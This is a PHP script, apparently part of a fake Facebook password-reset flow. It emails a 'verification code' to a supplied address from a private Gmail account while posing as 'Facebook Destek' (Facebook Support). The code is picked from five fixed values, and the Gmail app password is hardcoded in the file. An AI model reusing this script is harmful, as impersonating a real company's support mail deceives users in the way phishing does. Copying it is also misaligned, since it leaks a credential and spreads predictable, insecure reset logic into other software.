<?php
session_start();
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';
require 'PHPMailer/Exception.php';


$email = $_POST['email'];

// Rastgele bir doğrulama kodu seç
$codes = ['1842', '2973', '3305', '4629', '5581'];
$selected_code = $codes[array_rand($codes)];

// Session'a kaydet
$_SESSION['reset_email'] = $email;
$_SESSION['reset_code'] = $selected_code;

// Mail gönder
$mail = new PHPMailer(true);

try {
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'mersaulttest@gmail.com'; // Belirttiğin gönderici e-posta
    $mail->Password = 'amctlbmxforudhti';        // Belirttiğin uygulama şifresi
    $mail->SMTPSecure = 'tls';
    $mail->Port = 587;

    $mail->setFrom('mersaulttest@gmail.com', 'Facebook Destek');
    $mail->addAddress($email);
    $mail->isHTML(true);
    $mail->CharSet = 'UTF-8';
    $mail->Subject = 'Facebook Şifre Sıfırlama Kodu';
    $mail->Body = "
        <p>Şifre sıfırlama işlemi için doğrulama kodunuz:</p>
        <h2 style='color:#1877f2;'>$selected_code</h2>
        <p>Kodu doğrulama ekranına girerek devam edebilirsiniz.</p>";

    $mail->send();
    header("Location: verify-code.html");
    exit();
} catch (Exception $e) {
    echo "Mail gönderilemedi. Hata: {$mail->ErrorInfo}";
}
